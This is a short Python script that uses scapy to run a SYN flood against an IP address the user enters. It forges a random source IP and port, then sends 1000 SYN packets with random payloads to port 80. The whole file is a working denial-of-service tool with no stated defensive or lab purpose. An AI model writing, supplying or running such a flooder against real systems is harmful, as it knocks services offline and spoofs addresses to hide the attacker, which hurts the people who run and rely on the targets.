import random
import string

from scapy.layers.inet import IP, TCP
from scapy.sendrecv import sr1, send


def random_ip():
    i1 = random.randint(1, 254)
    i2 = random.randint(1, 254)
    i3 = random.randint(1, 254)
    i4 = random.randint(1, 254)
    ip = f"{i1}.{i2}.{i3}.{i4}"
    return ip


def random_port():
    port = random.randint(10000, 65535)
    return port


def flood(d_ip):
    s_ip = random_ip()
    s_port = random_port()
    payload = ''
    for i in range(4):
        srt = ''.join(random.sample(string.ascii_letters + string.digits, 50))
        payload = payload + srt
    for i in range(1000):
        send(IP(dst=d_ip, src=s_ip) / TCP(sport=s_port, dport=80, flags='S')/f"{payload}",verbose=0)


if __name__ == '__main__':
    ip = input('IP:')
    flood(ip)